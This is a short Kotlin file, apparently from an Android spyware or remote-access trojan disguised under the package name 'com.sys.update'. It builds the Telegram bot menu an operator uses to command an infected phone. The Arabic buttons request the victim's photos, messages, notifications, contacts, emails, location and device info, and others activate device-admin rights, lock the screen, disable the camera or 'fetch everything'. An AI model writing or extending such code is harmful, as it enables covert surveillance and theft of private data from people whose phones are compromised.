package com.sys.update

import org.json.JSONArray
import org.json.JSONObject

object KeyboardBuilder {

    fun replyKeyboard(): JSONObject {
        val keyboard = JSONArray()

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📸 كل الصور"))
            put(JSONObject().put("text", "📸 آخر 50"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📩 كل الرسائل"))
            put(JSONObject().put("text", "🔔 الإشعارات"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "👥 جهات الاتصال"))
            put(JSONObject().put("text", "📧 الإيميلات"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📊 معلومات الجهاز"))
            put(JSONObject().put("text", "📍 الموقع"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🛡 تفعيل Admin"))
            put(JSONObject().put("text", "🛡 معلومات Admin"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🔒 قفل الشاشة"))
            put(JSONObject().put("text", "📷 تعطيل الكاميرا"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🎵 تيك توك"))
            put(JSONObject().put("text", "🚀 جلب كل شي"))
        })

        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "❌ إخفاء"))
        })

        return JSONObject().apply {
            put("keyboard", keyboard)
            put("resize_keyboard", true)
            put("one_time_keyboard", false)
            put("is_persistent", true)
        }
    }

    fun backToMenu(): JSONObject = replyKeyboard()

    fun stopJob(jobId: String): JSONObject {
        val rows = JSONArray()
        rows.put(JSONArray().apply {
            put(JSONObject().put("text", "🛑 إيقاف العملية").put("callback_data", "stop_$jobId"))
        })
        return JSONObject().apply { put("inline_keyboard", rows) }
    }
}
